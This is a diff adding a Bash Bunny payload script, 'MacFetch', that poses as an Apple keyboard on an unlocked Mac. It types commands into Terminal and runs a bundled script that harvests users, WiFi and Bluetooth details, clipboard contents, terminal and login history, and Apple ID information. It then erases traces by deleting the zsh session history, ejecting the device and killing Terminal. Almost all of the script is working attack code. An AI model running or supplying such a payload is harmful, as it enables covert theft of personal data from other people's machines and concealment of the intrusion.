@@ -1,0 +1,63 @@
+#!/bin/bash
+#
+# Title:         MacFetch
+# Description:   Get a bunch of delicious data from unlocked macOS devices.
+# Author:        90N45
+# Version:       1.0
+# Category:      Recon
+# Attackmodes:   HID, STORAGE
+#
+# Saving the following Data:
+# - Current User
+# - All Users
+# - Hostname
+# - WiFi Interface
+# - Current WiFi Connection State
+# - Preferred WiFi Networks
+# - Known Bluetooth Devices
+# - Clipboard
+# - Public IP
+# - Open Network Ports
+# - Applications
+# - Applications Starting at System Boot/Login
+# - Software and Hardware Information
+# - Terminal History
+# - Login History
+# - Apple ID Information
+# - Ifconfig output
+
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+GET SWITCH_POSITION
+
+LED ATTACK
+# Open terminal
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 1500
+
+# Run fetch.sh script from BB (faster than writing all commands via HID)
+QUACK STRING "chmod +x /Volumes/BashBunny/payloads/${SWITCH_POSITION}/fetch.sh && bash /Volumes/BashBunny/payloads/${SWITCH_POSITION}/fetch.sh"
+QUACK ENTER
+
+QUACK DELAY 3000
+
+LED CLEANUP
+# Delete bash variables
+QUACK STRING unset date user users host wifi_interface current_wifi preffered_wifi bt_devices clipboard public_ip ports apps login_apps ware_info term_history login appleid ifaceconf
+QUACK ENTER 
+# Eject BB storage
+QUACK STRING diskutil eject /Volumes/BashBunny/
+QUACK ENTER
+# Remove terminal history from current session (commands used in attack won't be visible with the history command)
+QUACK STRING "rm -r ~/.zsh_sessions"
+QUACK ENTER
+# Exit terminal
+QUACK STRING killall Terminal
+QUACK ENTER
+
+sync
+
+LED FINISH
